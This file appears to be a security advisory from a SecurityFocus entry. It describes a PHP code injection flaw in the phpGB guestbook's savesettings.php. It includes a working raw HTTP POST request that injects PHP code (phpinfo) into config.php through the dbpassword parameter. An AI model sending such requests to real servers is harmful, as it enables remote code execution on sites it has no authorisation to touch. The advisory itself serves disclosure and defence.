@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/5679/info
+
+phpGB is subject to a PHP code injection vulnerability.
+
+After bypassing authentication it is possible to inject code into the guestbook configuration file (config.php) by supplying malicious parameters for the savesettings.php script. The configuration file is referenced in most of the other guestbook scripts, so each time one of the scripts is accessed the attacker-supplied PHP code will be executed.
+
+telnet example.com 80\n
+POST /phpGB/admin/savesettings.php HTTP/1.0\n
+Content-Type: application/x-www-form-urlencoded\n
+Content-Length: 123\n
+dbpassword=%22%3Bphpinfo%28%29%3B%24a%3D%22&toolbar=1
+&messenger=1&smileys=1&title=1&db_session_handler=0
+&all_in_one=0&test=\n
+\n 
